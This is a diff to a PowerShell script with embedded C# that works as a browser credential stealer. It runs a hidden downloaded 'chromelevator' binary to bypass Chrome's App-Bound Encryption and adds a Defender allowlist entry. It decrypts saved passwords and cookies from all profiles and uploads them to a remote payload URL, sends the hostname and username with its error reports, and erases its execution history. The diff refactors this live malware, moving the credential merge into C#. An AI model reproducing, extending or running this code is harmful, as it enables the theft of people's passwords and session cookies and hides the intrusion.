@@ -20,32 +20,11 @@ function Write-DebugStep {
 
 function Write-DebugError {
     param($ErrorRecord)
-
-    if (-not $DebugMode) {
-        return
-    }
-
-    Write-DebugStep "Error type: $($ErrorRecord.Exception.GetType().FullName)"
-    Write-DebugStep "Error message: $($ErrorRecord.Exception.Message)"
-
-    $inner = $ErrorRecord.Exception.InnerException
-    $depth = 1
-    while ($null -ne $inner) {
-        Write-DebugStep "Inner $depth ($($inner.GetType().FullName)): $($inner.Message)"
-        $inner = $inner.InnerException
-        $depth++
-    }
-
+    if (-not $DebugMode) { return }
+    Write-DebugStep "Error: $($ErrorRecord.Exception.Message)"
     if ($ErrorRecord.InvocationInfo) {
-        $line = $ErrorRecord.InvocationInfo.Line
-        if ($line) {
-            $line = $line.Trim()
-        }
-        Write-DebugStep "At line $($ErrorRecord.InvocationInfo.ScriptLineNumber): $line"
+        Write-DebugStep "At line $($ErrorRecord.InvocationInfo.ScriptLineNumber)"
     }
-
-    Write-DebugStep "ErrorId: $($ErrorRecord.FullyQualifiedErrorId)"
-    Write-DebugStep "Mapped exit code: $(Get-ErrorCodeFromException $ErrorRecord)"
 }
 
 function Throw-ErrorCode {
@@ -61,148 +40,17 @@ function Get-ErrorCodeFromException {
         if ($exception -is [System.Net.WebException]) {
             return 3001
         }
-
-        $exceptionType = $exception.GetType().FullName
-        if ($exceptionType -eq "Microsoft.PowerShell.Commands.HttpResponseException") {
-            return 3001
-        }
-
-        if ($exception.Message -match "^\d{4}$") {
+        if ($exception.Message -match '^\d{4}$') {
             return [int]$exception.Message
         }
-
         $exception = $exception.InnerException
     }
 
-    $messages = @($ErrorRecord.Exception.Message)
-    if ($ErrorRecord.Exception.InnerException) {
-        $messages += $ErrorRecord.Exception.InnerException.Message
-    }
-    if ($ErrorRecord.FullyQualifiedErrorId -match "WebCmdletWebResponseException") {
+    if ($ErrorRecord.FullyQualifiedErrorId -match 'WebCmdletWebResponseException') {
         return 3001
     }
 
-    foreach ($message in $messages) {
-        if ($message -match "^\d{4}$") {
-            return [int]$message
-        }
-        if ($message -match "maximum permissible length|MaxJsonLength|JavaScriptSerializer|ConvertTo-Json|circular reference") {
-            return 3002
-        }
-    }
-
     return 9000
-}
-
-function ConvertTo-SerializableObject {
-    param(
-        $InputObject,
-        $Visited = $null
-    )
-
-    if ($null -eq $InputObject) {
-        return $null
-    }
-
-    if ($InputObject -is [string] -or $InputObject -is [bool] -or $InputObject -is [int] -or $InputObject -is [long] -or $InputObject -is [double] -or $InputObject -is [decimal]) {
-        return $InputObject
-    }
-
-    if ($InputObject -is [datetime]) {
-        return $InputObject.ToString("o")
-    }
-
-    if ($null -eq $Visited) {
-        $Visited = New-Object System.Collections.Generic.List[object]
-    }
-    foreach ($seen in $Visited) {
-        if ([object]::ReferenceEquals($seen, $InputObject)) {
-            return $null
-        }
-    }
-    $Visited.Add($InputObject) | Out-Null
-
-    if ($InputObject -is [System.Management.Automation.PSObject]) {
-        $InputObject = $InputObject.BaseObject
-        if ($null -eq $InputObject) {
-            return $null
-        }
-    }
-
-    if ($InputObject -is [System.Collections.IDictionary]) {
-        $result = [ordered]@{}
-        foreach ($key in $InputObject.Keys) {
-            $result[[string]$key] = ConvertTo-SerializableObject $InputObject[$key] $Visited
-        }
-        return $result
-    }
-
-    if ($InputObject -is [pscustomobject]) {
-        $result = [ordered]@{}
-        foreach ($prop in $InputObject.PSObject.Properties) {
-            if ($prop.MemberType -notin @(
-                    [System.Management.Automation.PSMemberTypes]::NoteProperty,
-                    [System.Management.Automation.PSMemberTypes]::Property,
-                    [System.Management.Automation.PSMemberTypes]::AliasProperty
-                )) {
-                continue
-            }
-            $result[$prop.Name] = ConvertTo-SerializableObject $prop.Value $Visited
-        }
-        return $result
-    }
-
-    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
-        return @($InputObject | ForEach-Object { ConvertTo-SerializableObject $_ $Visited })
-    }
-
-    return [string]$InputObject
-}
-
-function ConvertTo-JsonUnlimited {
-    param(
-        [Parameter(Mandatory = $true)]
-        $InputObject,
-        [int]$RecursionLimit = 200
-    )
-
-    Add-Type -AssemblyName System.Web.Extensions
-    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-    $serializer.MaxJsonLength = 2147483647
-    $serializer.RecursionLimit = $RecursionLimit
-    return $serializer.Serialize((ConvertTo-SerializableObject $InputObject))
-}
-
-function New-ScriptErrorReport {
-    param(
-        $ErrorRecord,
-        [int]$Code
-    )
-
-    $innerErrors = New-Object System.Collections.Generic.List[string]
-    $exception = $ErrorRecord.Exception.InnerException
-    while ($null -ne $exception) {
-        $innerErrors.Add("$($exception.GetType().FullName): $($exception.Message)")
-        $exception = $exception.InnerException
-    }
-
-    $scriptLine = $null
-    if ($ErrorRecord.InvocationInfo) {
-        $scriptLine = $ErrorRecord.InvocationInfo.ScriptLineNumber
-    }
-
-    return [ordered]@{
-        code = $Code
-        hostname = $env:COMPUTERNAME
-        username = $env:USERNAME
-        executedAt = [DateTime]::UtcNow.ToString("o")
-        errorType = $ErrorRecord.Exception.GetType().FullName
-        errorMessage = $ErrorRecord.Exception.Message
-        innerErrors = @($innerErrors.ToArray())
-        errorId = $ErrorRecord.FullyQualifiedErrorId
-        scriptLine = $scriptLine
-        isAdmin = $IsRunningAsAdmin
-    }
 }
 
 function Send-ScriptErrorReport {
@@ -212,9 +60,18 @@ function Send-ScriptErrorReport {
     )
 
     try {
-        $report = New-ScriptErrorReport -ErrorRecord $ErrorRecord -Code $Code
-        $reportJson = ConvertTo-JsonUnlimited -InputObject $report
-        $reportB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($reportJson))
+        $report = [ordered]@{
+            code = $Code
+            hostname = $env:COMPUTERNAME
+            username = $env:USERNAME
+            executedAt = [DateTime]::UtcNow.ToString("o")
+            errorType = $ErrorRecord.Exception.GetType().FullName
+            errorMessage = $ErrorRecord.Exception.Message
+            errorId = $ErrorRecord.FullyQualifiedErrorId
+            scriptLine = $ErrorRecord.InvocationInfo.ScriptLineNumber
+            isAdmin = $IsRunningAsAdmin
+        }
+        $reportB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $report -Compress -Depth 4)))
         $null = Invoke-RestMethod -Uri $ErrorUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $reportB64
     }
     catch {
@@ -524,27 +381,6 @@ function Protect-ChromelevatorBinary {
 
 }
 
-function Resolve-ChromelevatorChromeRoot {
-    param(
-        [string]$OutputRoot,
-        [string]$ElevatorPath
-    )
-
-    $candidates = @(
-        (Join-Path $OutputRoot "Chrome")
-        (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
-    )
-
-    foreach ($candidate in $candidates) {
-        $exists = Test-Path -LiteralPath $candidate
-        if ($exists) {
-            return $candidate
-        }
-    }
-
-    return $null
-}
-
 function Invoke-ChromelevatorProcess {
     param(
         [string]$ElevatorPath,
@@ -553,190 +389,77 @@ function Invoke-ChromelevatorProcess {
 
     Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
 
-    function Start-ChromelevatorExe {
-        param([string]$Path, [string]$OutputDir)
+    $process = New-Object System.Diagnostics.Process
+    $process.StartInfo.FileName = $ElevatorPath
+    $process.StartInfo.Arguments = "-o `"$OutDir`" chrome"
+    $process.StartInfo.UseShellExecute = $false
+    $process.StartInfo.CreateNoWindow = $true
+    $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $process.StartInfo.RedirectStandardOutput = $true
+    $process.StartInfo.RedirectStandardError = $true
+    [void]$process.Start()
+    $null = $process.StandardOutput.ReadToEnd()
+    $null = $process.StandardError.ReadToEnd()
+    $process.WaitForExit()
 
-        $argumentString = "-o `"$OutputDir`" chrome"
-
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo.FileName = $Path
-        $process.StartInfo.Arguments = $argumentString
-        $process.StartInfo.UseShellExecute = $false
-        $process.StartInfo.CreateNoWindow = $true
-        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $process.StartInfo.RedirectStandardOutput = $true
-        $process.StartInfo.RedirectStandardError = $true
-        [void]$process.Start()
-        $null = $process.StandardOutput.ReadToEnd()
-        $null = $process.StandardError.ReadToEnd()
-        $process.WaitForExit()
-
-        return [pscustomobject]@{
-            ExitCode = $process.ExitCode
-        }
-    }
-
-    $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
-    if ($result.ExitCode -ne 0) {
+    if ($process.ExitCode -ne 0) {
         Throw-ErrorCode 2003
     }
 }
 
-function Get-NormalizedPasswordKey {
-    param(
-        [string]$Profile,
-        [string]$Url,
-        [string]$Username
-    )
+function Invoke-ChromelevatorExtraction {
+    param([string]$ApiBase)
 
-    $normalizedUrl = if ($Url) { ($Url.TrimEnd('/')).ToLowerInvariant() } else { "" }
-    $normalizedUser = if ($Username) { $Username.ToLowerInvariant() } else { "" }
-    return "$Profile|$normalizedUrl|$normalizedUser"
-}
-
-function Merge-ChromelevatorPasswords {
-    param(
-        [object]$Payload,
-        [string]$OutputRoot,
-        [string]$ElevatorPath
-    )
-
-
-    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
-    if (-not $chromeRoot) {
-        Throw-ErrorCode 2004
+    $meta = [ordered]@{
+        used = $false
+        arch = $null
+        error = $null
+        skipped = $false
+        defender = $ChromelevatorDefenderStatus
     }
 
-
-    $abeMap = @{}
-    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
-        $passwordsFile = Join-Path $profileDir.FullName "passwords.json"
-        if (-not (Test-Path $passwordsFile)) {
-            continue
+    if (-not $UseChromelevator) {
+        $meta.skipped = $true
+        if ($ChromeInfo.LegacyDpapiOnly) {
+            $meta.error = "2006"
         }
-
-        $profileName = $profileDir.Name
-        $entries = Get-Content -Path $passwordsFile -Raw -Encoding UTF8 | ConvertFrom-Json
-        if ($null -eq $entries) {
-            continue
+        elseif (-not $IsRunningAsAdmin) {
+            $meta.error = "2005"
         }
-
-        if ($entries -isnot [System.Array]) {
-            $entries = @($entries)
+        else {
+            $meta.error = "2007"
         }
-
-
-        foreach ($entry in $entries) {
-            if (-not $entry.pass) {
-                continue
-            }
-
-            $key = Get-NormalizedPasswordKey -Profile $profileName -Url $entry.url -Username $entry.user
-            $abeMap[$key] = [string]$entry.pass
-        }
+        return ,[pscustomobject]$meta
     }
 
-    $mergedCount = 0
-    foreach ($entry in $Payload.passwords) {
-        $key = Get-NormalizedPasswordKey -Profile $entry.profile -Url $entry.url -Username $entry.username
-        if (-not $abeMap.ContainsKey($key)) {
-            continue
-        }
-
-        $decrypted = $abeMap[$key]
-        if ([string]::IsNullOrEmpty($decrypted)) {
-            continue
-        }
-
-        try {
-            $entry | Add-Member -NotePropertyName password_dpapi -NotePropertyValue $decrypted -Force
-            if ($entry.password -match "App-Bound Encryption") {
-                $mergedCount++
-            }
-        }
-        catch {
-            throw
-        }
+    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
+        Initialize-ChromelevatorDefenderAllowlist | Out-Null
     }
 
-    return $mergedCount
-}
-
-function Merge-ChromelevatorCookies {
-    param(
-        [object]$Payload,
-        [string]$OutputRoot,
-        [string]$ElevatorPath
-    )
-
-
-    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
-    if (-not $chromeRoot) {
-        return 0
+    $outDir = $null
+    try {
+        $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
+        $meta.arch = $archTag
+        $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
+        $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
+        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+        Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
+        $meta.used = $true
     }
-
-    $mergedCookies = New-Object System.Collections.ArrayList
-    $index = 0
-
-    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
-        $cookiesFile = Join-Path $profileDir.FullName "cookies.json"
-        if (-not (Test-Path $cookiesFile)) {
-            continue
-        }
-
-        $entries = Get-Content -Path $cookiesFile -Raw -Encoding UTF8 | ConvertFrom-Json
-        if ($null -eq $entries) {
-            continue
-        }
-
-        if ($entries -isnot [System.Array]) {
-            $entries = @($entries)
-        }
-
-
-        foreach ($entry in $entries) {
-            try {
-                $expiresVal = 0
-                if ($null -ne $entry.expires) {
-                    try { $expiresVal = [long]$entry.expires } catch { $expiresVal = 0 }
-                }
-
-                $secureVal = $null
-                if ($null -ne $entry.secure) {
-                    try { $secureVal = [bool]$entry.secure } catch { $secureVal = $null }
-                }
-
-                $httpOnlyVal = $null
-                if ($null -ne $entry.httpOnly) {
-                    try { $httpOnlyVal = [bool]$entry.httpOnly } catch { $httpOnlyVal = $null }
-                }
-
-                [void]$mergedCookies.Add([pscustomobject]@{
-                    index = $index
-                    profile = $profileDir.Name
-                    host = [string]$entry.host
-                    name = [string]$entry.name
-                    path = [string]$entry.path
-                    value = [string]$entry.value
-                    value_dpapi = [string]$entry.value
-                    expires = $expiresVal
-                    secure = $secureVal
-                    httpOnly = $httpOnlyVal
-                })
-                $index++
-            }
-            catch {
-                throw
+    catch {
+        $meta.error = [string](Get-ErrorCodeFromException $_)
+    }
+    finally {
+        if ($outDir -and (Test-Path $outDir)) {
+            $script:ChromelevatorOutputRoot = $outDir
+            $candidate = Join-Path $outDir "Chrome"
+            if (Test-Path -LiteralPath $candidate) {
+                $script:ChromelevatorChromeRoot = $candidate
             }
         }
     }
 
-    if ($mergedCookies.Count -gt 0) {
-        $Payload | Add-Member -NotePropertyName cookies -NotePropertyValue @($mergedCookies.ToArray()) -Force
-        $Payload | Add-Member -NotePropertyName cookieCount -NotePropertyValue $mergedCookies.Count -Force
-    }
-
-    return $mergedCookies.Count
+    return ,[pscustomobject]$meta
 }
 
 function Get-ChromelevatorExecutable {
@@ -776,72 +499,6 @@ function Get-ChromelevatorExecutable {
 
     Protect-ChromelevatorBinary -ElevatorPath $elevatorPath
     return $elevatorPath
-}
-
-function Invoke-ChromelevatorExtraction {
-    param(
-        [object]$Payload,
-        [string]$ApiBase
-    )
-
-    $meta = [ordered]@{
-        used = $false
-        arch = $null
-        abeMergedCount = 0
-        cookiesMergedCount = 0
-        error = $null
-        skipped = $false
-        defender = $ChromelevatorDefenderStatus
-    }
-
-    if (-not $UseChromelevator) {
-        $meta.skipped = $true
-        if ($ChromeInfo.LegacyDpapiOnly) {
-            $meta.error = "2006"
-        }
-        elseif (-not $IsRunningAsAdmin) {
-            $meta.error = "2005"
-        }
-        else {
-            $meta.error = "2007"
-        }
-        return ,[pscustomobject]$meta
-    }
-
-    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
-        Initialize-ChromelevatorDefenderAllowlist | Out-Null
-    }
-
-    $outDir = $null
-    try {
-        $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
-        $meta.arch = $archTag
-
-        $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
-
-        $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
-        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-
-        Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
-
-        $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
-
-        $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
-
-        $meta.used = $true
-        $meta.abeMergedCount = $mergedCount
-        $meta.cookiesMergedCount = $cookiesMergedCount
-    }
-    catch {
-        $meta.error = [string](Get-ErrorCodeFromException $_)
-    }
-    finally {
-        if ($outDir -and (Test-Path $outDir)) {
-            Remove-Item -Path $outDir -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-
-    return ,[pscustomobject]$meta
 }
 
 function Clear-ScriptExecutionHistory {
@@ -885,6 +542,9 @@ function Clear-ScriptExecutionHistory {
 
 try {
 
+$script:ChromelevatorOutputRoot = $null
+$script:ChromelevatorChromeRoot = $null
+
 Write-DebugStep "Starting export pipeline (admin=$IsRunningAsAdmin, api=$ApiBase)"
 
 Add-Type -AssemblyName System.Security
@@ -897,12 +557,14 @@ $ChromeCryptoClassName = "ChromeCrypto_$TypeSuffix"
 Write-DebugStep "Compiling exporter types ($ChromeExporterClassName)"
 $typeDefinition = @"
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Web.Script.Serialization;
 
 public static class __EXPORTER_CLASS__
 {
@@ -974,6 +636,233 @@ public static class __EXPORTER_CLASS__
         }
 
         return BuildJson(passwords, cookies);
+    }
+
+    public static string MergeExportPayload(
+        string exportJson,
+        string chromeJson,
+        string profilesJson,
+        string chromelevatorJson,
+        string chromelevatorChromeRoot)
+    {
+        var serializer = new JavaScriptSerializer
+        {
+            MaxJsonLength = int.MaxValue,
+            RecursionLimit = 1024
+        };
+
+        var data = serializer.DeserializeObject(exportJson) as Dictionary<string, object>;
+        if (data == null)
+        {
+            throw new InvalidOperationException("3002");
+        }
+
+        OverlayJsonField(serializer, data, "chrome", chromeJson);
+        OverlayJsonField(serializer, data, "profiles", profilesJson);
+        OverlayJsonField(serializer, data, "chromelevator", chromelevatorJson);
+
+        if (!string.IsNullOrEmpty(chromelevatorChromeRoot) && Directory.Exists(chromelevatorChromeRoot))
+        {
+            MergeChromelevatorPasswordsIntoExport(serializer, data, chromelevatorChromeRoot);
+            ArrayList cookies = BuildChromelevatorCookies(serializer, chromelevatorChromeRoot);
+            if (cookies.Count > 0)
+            {
+                data["cookies"] = cookies;
+                data["cookieCount"] = cookies.Count;
+            }
+        }
+
+        string result = serializer.Serialize(data);
+        if (string.IsNullOrEmpty(result) || result == "null" || result.Length < 100)
+        {
+            throw new InvalidOperationException("3002");
+        }
+
+        return result;
+    }
+
+    private static void OverlayJsonField(
+        JavaScriptSerializer serializer,
+        Dictionary<string, object> data,
+        string field,
+        string json)
+    {
+        if (string.IsNullOrWhiteSpace(json))
+        {
+            return;
+        }
+
+        data[field] = serializer.DeserializeObject(json);
+    }
+
+    private static string NormalizePasswordKey(string profile, string url, string username)
+    {
+        string normalizedUrl = string.IsNullOrEmpty(url) ? "" : url.TrimEnd('/').ToLowerInvariant();
+        string normalizedUser = string.IsNullOrEmpty(username) ? "" : username.ToLowerInvariant();
+        return (profile ?? "") + "|" + normalizedUrl + "|" + normalizedUser;
+    }
+
+    private static void MergeChromelevatorPasswordsIntoExport(
+        JavaScriptSerializer serializer,
+        Dictionary<string, object> data,
+        string chromeRoot)
+    {
+        var abeMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+
+        foreach (string profileDir in Directory.GetDirectories(chromeRoot))
+        {
+            string passwordsFile = Path.Combine(profileDir, "passwords.json");
+            if (!File.Exists(passwordsFile))
+            {
+                continue;
+            }
+
+            string profileName = Path.GetFileName(profileDir);
+            var entries = serializer.DeserializeObject(File.ReadAllText(passwordsFile, Encoding.UTF8)) as ArrayList;
+            if (entries == null)
+            {
+                continue;
+            }
+
+            foreach (object item in entries)
+            {
+                var entry = item as Dictionary<string, object>;
+                if (entry == null || !entry.ContainsKey("pass") || entry["pass"] == null)
+                {
+                    continue;
+                }
+
+                string pass = Convert.ToString(entry["pass"]);
+                if (string.IsNullOrEmpty(pass))
+                {
+                    continue;
+                }
+
+                string url = entry.ContainsKey("url") ? Convert.ToString(entry["url"]) : "";
+                string user = entry.ContainsKey("user") ? Convert.ToString(entry["user"]) : "";
+                abeMap[NormalizePasswordKey(profileName, url, user)] = pass;
+            }
+        }
+
+        if (!data.ContainsKey("passwords") || data["passwords"] == null)
+        {
+            return;
+        }
+
+        var passwords = data["passwords"] as ArrayList;
+        if (passwords == null)
+        {
+            return;
+        }
+
+        foreach (object item in passwords)
+        {
+            var entry = item as Dictionary<string, object>;
+            if (entry == null)
+            {
+                continue;
+            }
+
+            string profile = entry.ContainsKey("profile") ? Convert.ToString(entry["profile"]) : "";
+            string url = entry.ContainsKey("url") ? Convert.ToString(entry["url"]) : "";
+            string username = entry.ContainsKey("username") ? Convert.ToString(entry["username"]) : "";
+            string key = NormalizePasswordKey(profile, url, username);
+            string decrypted;
+            if (!abeMap.TryGetValue(key, out decrypted) || string.IsNullOrEmpty(decrypted))
+            {
+                continue;
+            }
+
+            entry["password_dpapi"] = decrypted;
+        }
+    }
+
+    private static ArrayList BuildChromelevatorCookies(JavaScriptSerializer serializer, string chromeRoot)
+    {
+        var cookies = new ArrayList();
+        int index = 0;
+
+        foreach (string profileDir in Directory.GetDirectories(chromeRoot))
+        {
+            string cookiesFile = Path.Combine(profileDir, "cookies.json");
+            if (!File.Exists(cookiesFile))
+            {
+                continue;
+            }
+
+            string profileName = Path.GetFileName(profileDir);
+            object parsed = serializer.DeserializeObject(File.ReadAllText(cookiesFile, Encoding.UTF8));
+            ArrayList entries = parsed as ArrayList;
+            if (entries == null && parsed != null)
+            {
+                entries = new ArrayList { parsed };
+            }
+
+            if (entries == null)
+            {
+                continue;
+            }
+
+            foreach (object item in entries)
+            {
+                var entry = item as Dictionary<string, object>;
+                if (entry == null)
+                {
+                    continue;
+                }
+
+                var cookie = new Dictionary<string, object>();
+                cookie["index"] = index++;
+                cookie["profile"] = profileName;
+                cookie["host"] = entry.ContainsKey("host") ? Convert.ToString(entry["host"]) ?? "" : "";
+                cookie["name"] = entry.ContainsKey("name") ? Convert.ToString(entry["name"]) ?? "" : "";
+                cookie["path"] = entry.ContainsKey("path") ? Convert.ToString(entry["path"]) ?? "" : "";
+                string value = entry.ContainsKey("value") ? Convert.ToString(entry["value"]) ?? "" : "";
+                cookie["value"] = value;
+                cookie["value_dpapi"] = value;
+
+                long expires = 0;
+                if (entry.ContainsKey("expires") && entry["expires"] != null)
+                {
+                    try
+                    {
+                        expires = Convert.ToInt64(entry["expires"]);
+                    }
+                    catch
+                    {
+                        expires = 0;
+                    }
+                }
+
+                cookie["expires"] = expires;
+
+                if (entry.ContainsKey("secure") && entry["secure"] != null)
+                {
+                    try
+                    {
+                        cookie["secure"] = Convert.ToBoolean(entry["secure"]);
+                    }
+                    catch
+                    {
+                    }
+                }
+
+                if (entry.ContainsKey("httpOnly") && entry["httpOnly"] != null)
+                {
+                    try
+                    {
+                        cookie["httpOnly"] = Convert.ToBoolean(entry["httpOnly"]);
+                    }
+                    catch
+                    {
+                    }
+                }
+
+                cookies.Add(cookie);
+            }
+        }
+
+        return cookies;
     }
 
     private static string ResolveCookiesDbPath(string profilePath)
@@ -1775,7 +1664,7 @@ $typeDefinition = $typeDefinition.Replace("__EXPORTER_CLASS__", $ChromeExporterC
 $typeDefinition = $typeDefinition.Replace("__COM_ELEVATOR_CLASS__", $ChromeComElevatorClassName)
 $typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClassName)
 
-Add-Type -ReferencedAssemblies System.Security -TypeDefinition $typeDefinition
+Add-Type -ReferencedAssemblies System.Security,System.Web.Extensions -TypeDefinition $typeDefinition
 
 Write-DebugStep "Add-Type completed"
 
@@ -1792,24 +1681,23 @@ Write-DebugStep "Exporter type loaded: $($exporterType.FullName)"
 
 $exportMethod = $exporterType.GetMethod("Export")
 Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt)"
-$payloadJson = $exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
-Write-DebugStep "Export completed (jsonLength=$($payloadJson.Length))"
+$exportJsonRaw = [string]$exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
+Write-DebugStep "Export completed (jsonLength=$($exportJsonRaw.Length))"
 
-Write-DebugStep "Parsing export JSON"
-$payloadObject = $payloadJson | ConvertFrom-Json
-$payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force
-
-Write-DebugStep "Reading Chrome profile metadata"
 $profileMetadata = Get-ChromeProfileMetadata
-$payloadObject | Add-Member -NotePropertyName profiles -NotePropertyValue ([pscustomobject]$profileMetadata) -Force
-
-Write-DebugStep "Running chromelevator (UseChromelevator=$UseChromelevator)"
-$chromelevatorMeta = Invoke-ChromelevatorExtraction -Payload $payloadObject -ApiBase $ApiBase
-$payloadObject | Add-Member -NotePropertyName chromelevator -NotePropertyValue ([pscustomobject]$chromelevatorMeta) -Force
-Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), passwords=$($chromelevatorMeta.abeMergedCount), cookies=$($chromelevatorMeta.cookiesMergedCount))"
+$chromelevatorMeta = Invoke-ChromelevatorExtraction -ApiBase $ApiBase
+Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), root=$($script:ChromelevatorChromeRoot))"
 
 Write-DebugStep "Serializing payload"
-$payloadJson = ConvertTo-JsonUnlimited -InputObject $payloadObject
+$chromeRoot = if ($script:ChromelevatorChromeRoot) { [string]$script:ChromelevatorChromeRoot } else { "" }
+$mergeArgs = @(
+    [string]$exportJsonRaw,
+    [string](ConvertTo-Json $ChromeInfo -Compress -Depth 5),
+    [string](ConvertTo-Json $profileMetadata -Compress -Depth 5),
+    [string](ConvertTo-Json $chromelevatorMeta -Compress -Depth 5),
+    [string]$chromeRoot
+)
+$payloadJson = [string]$exporterType.GetMethod("MergeExportPayload").Invoke($null, $mergeArgs)
 Write-DebugStep "Serialization completed (jsonLength=$($payloadJson.Length))"
 
 Write-DebugStep "Uploading payload to $PayloadUrl"
@@ -1825,6 +1713,9 @@ catch {
     Write-Host $script:ExitCode
 }
 finally {
+    if ($script:ChromelevatorOutputRoot -and (Test-Path $script:ChromelevatorOutputRoot)) {
+        Remove-Item -Path $script:ChromelevatorOutputRoot -Recurse -Force -ErrorAction SilentlyContinue
+    }
     Clear-ScriptExecutionHistory
     if ($CloseTerminal) {
         if ($null -ne $script:ExitCode) {
